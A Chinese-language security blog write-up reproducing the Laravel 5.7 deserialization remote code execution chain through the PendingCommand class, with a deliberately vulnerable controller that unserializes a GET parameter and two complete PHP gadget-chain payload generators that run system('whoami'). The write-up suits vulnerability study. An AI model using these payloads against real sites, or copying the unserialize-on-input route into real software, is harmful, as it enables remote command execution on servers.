---
title: "laravel v5.7反序列化rce"
date: 2021-05-30T21:25:20+08:00
---

### 前言

Laravel is a web application framework with expressive, elegant syntax.  We’ve already laid the foundation — freeing you to create without  sweating the small things.

这个CVE从开始入手到今天正式完工大概花了一周左右吧...感觉自己还是走了不少弯路的，也在这里分享一下自己的心得体验。

首先初探一个自己不熟悉的框架，除非是CTF那样时间比较紧迫的情况，还是建议花几个小时看一看文档和一些经典的机制，这里我是跟着3rsh1学长这[几篇博客](https://www.3rsh1.cool/2020/07/23/lavarel_zhuan_ti_1/)走的。后续呢我收藏了好几篇相关的分析文章，打了一个很大的架势开始动手。然后就是跟着别人的流程，一步一步调，但是这样效率很低，即使最后复现成功，要想说一遍流程都说不出来。

后来就直接干脆关了全部的文章，还是自己一步一步来，所以这篇文章可能会说的有一些啰嗦，不过也是我分析这个CVE的心得体会吧。

### 环境搭建

首先起一个框架：

```bash
composer create-project laravel/laravel laravel57 "5.7.*"
cd laravel57
php artisan serve
```

laravel5.7本身是没用可以反序列化的入口的，所以需要我们自己写一个路由和控制器。

在 **laravel57/routes/web.php** 文件中添加一条路由

```php
<?php
Route::get("/theoyu","\App\Http\Controllers\DemoController@demo");
?>
```
在 laravel57/app/Http/Controllers/ 下添加 DemoController 控制器
```php
<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;

class DemoController extends Controller
{
    public function demo()
    {
        if(isset($_GET['c'])){
            $code = $_GET['c'];
            unserialize($code);
        }
        else{
            highlight_file(__FILE__);
        }
        return "Welcome to laravel5.7";
    }
}
```

### 漏洞分析

可用于执行命令的功能位于 **Illuminate/Foundation/Testing/PendingCommand** 类的 **run** 方法中，而该 **run** 方法在 **__destruct** 方法中调用。

我们先看一看**PendingCommand** 这个类有哪些属性

```
$this->test;        //一个实例化的类 
$this->app;         //一个实例化的类 
$this->command;     //要执行的php函数 system
$this->parameters;  //要执行的php函数的参数  array('whoami')
```

至于`$test`和`$app`具体是什么，我们暂时还不得而知，不过我们看看下面需要执行的命令

![image-20210530183118698](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530183118698.png)

也就是说，要想命令执行，首先我们得顺利走到try这一步，然后`$app[Kernel::class]`需要返回一个具有call方法的实例。

我们先简单写一个雏形，看看调试结果。

![image-20210530143546672](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530143546672.png)

我们首先会进入`mockConsoleOutput()`当中，纵观这个函数有两个地方我们需要注意：

![image-20210530184311920](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530184311920.png)

因为我们还没有对`$test`做任何的处理，所有`$test`本身没有任何的属性，所以标注1的`test->expectedQuestions`自然会报错，同理在标注2中进入的`createABufferedOutputMock()`也有一步`test->expectedOutput`会失败，如下图。

![image-20210530143630253](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530143630253.png)

但在两个属性要想直接构造是比较困难的，这里平时做ctf会容易想到一点也就是魔术方法`__get()`,我们选择GenericUser类

![image-20210530185536721](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530185536721.png)

构造如下，只对`$test`进行更改

![image-20210530150611621](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530150611621.png)

![image-20210530151122289](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530151122289.png)

可以看到我们成功走到了`mockConsoleOutput()`的最后一步

```php
 $this->app->bind(OutputStyle::class, function () use ($mock) {
            return $mock;
        }
```

但是由于我们`$app`还只是一个字符串，并没有`bind`方法，这是因为我最开始的时候走远了，实际上在**PendingCommand**中就写有`$app`是在`\Illuminate\Foundation\Application`的实例，同时`Application `类是继承自`Illuminate\Container\Container`。在`Container`类中我们可以找到对应的`bind`函数,ok那么现在构造如下。

![image-20210530162308651](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530162308651.png)

再次断点调试,我们终于走到了命令执行最关键的一步，但是在这一步直接挂掉了。

`$exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters);`

我们把这一步拆成三步，断点调试：   

![image-20210530162741610](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530162741610.png)

我们发现`Kernel::class`是一个常量，返回`Illuminate\Contracts\Console\Kernel`

发现是在第二步就直接挂掉了，我们跟进看看。

![image-20210530195743543](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530195743543.png)

这里进入到了一个父类`Container`的make函数，跟进resolve

![image-20210530200136412](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530200136412.png)

这里的标注1很关键，首先instances数组本身是我们可控的，然后键名`$anstract`也已知，那我们完全可以控制这里的return返回值，也就控制了第二步中`$this->app[Kernel::class]`的返回值。

同理，我们跟进标注2 的`getConcrete()`

![image-20210530200455485](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530200455485.png)

可以发现这里同样可以控制返回，那现在我们需要明确的问题是，我们应该返回一个怎样的对象，其含有`call()`方法可以让我们进行命令执行。

就在`Illuminate\Foundation\Application`所继承的 `Illuminate\Container\Container`下，找到了我们需要的函数：

![image-20210530201258106](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530201258106.png)

这里进入的话会发现调用了`call_user_func_array`回调函数，至此我们的利用链也差不多分析结束。作者返回的是子类`Application`,不过是继承关系的也都没有关系嘛。

那么如果用标注1`instances[]`的方法话，构造如下：

```php
<?php

namespace Illuminate\Auth;
class GenericUser
{
    protected $attributes;
    public function __construct(array $attributes)
    {
        $this->attributes = $attributes;
    }
}
$array=array('expectedOutput' => array("0"=>"1"), 'expectedQuestions' => array("0"=>"1"));
$test=new GenericUser($array);

namespace Illuminate\Foundation;
class Application
{
    protected $instances=[];
    public function __construct($instances=[]){
    $this->instances['Illuminate\Contracts\Console\Kernel']=$instances;
    }
}
$tmp=new Application(); //最后需要返回这个实例，tmp作为中间层处理一下
$app=new Application($tmp);

namespace Illuminate\Foundation\Testing;
class PendingCommand{
    public $test;
    protected $app;
    protected $command;
    protected $parameters;
    public  function __construct($test,$app,$command,$parameters){
        $this->test=$test;
        $this->app=$app;
        $this->command=$command;
        $this->parameters=$parameters;
    }
}

$demo= new PendingCommand($test,$app,"system",array("whoami"));
echo urlencode(serialize($demo));
?>
```

![image-20210530204314832](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530204314832.png)

如果选择标注2的方法，我们需要对`bindings[$abstract]['concrete']`进行控制，而`$abstract`的值就是`Illuminate\Contracts\Console\Kernel`,所以我们能够利用二维数组控制`['concrete']`：
```php
<?php

namespace Illuminate\Auth;
class GenericUser
{
    protected $attributes;
    public function __construct(array $attributes)
    {
        $this->attributes = $attributes;
    }
}
$array=array('expectedOutput' => array("0"=>"1"), 'expectedQuestions' => array("0"=>"1"));
$test=new GenericUser($array);

namespace Illuminate\Foundation;
class Application
{
    protected $bindings=[];
    public function __construct(){
        $this->bindings['Illuminate\Contracts\Console\Kernel']=array("concrete"=>"Illuminate\Container\Container");
    }
}
$app=new Application();

namespace Illuminate\Foundation\Testing;
class PendingCommand{
    public $test;
    protected $app;
    protected $command;
    protected $parameters;
    public  function __construct($test,$app,$command,$parameters){
        $this->test=$test;
        $this->app=$app;
        $this->command=$command;
        $this->parameters=$parameters;
    }
}

$demo= new PendingCommand($test,$app,"system",array("whoami"));
echo urlencode(serialize($demo));

?>

```

![image-20210530205343911](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530205343911.png)

最后关于`callback`的回调函数就不多说了。

![image-20210530210120964](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-30-image-20210530210120964.png)

### 总结

不得不说这种框架类的反序列化pop链挖掘真的有意思，ctf中的反序列化更多是重于原生利用类的构造。不过这次的更新时间已经超过了之前定的一周两个...emm下一个目标应该在Thinkphp吧。

### 参考

https://www.3rsh1.cool/2020/07/23/lavarel_zhuan_ti_1/

https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/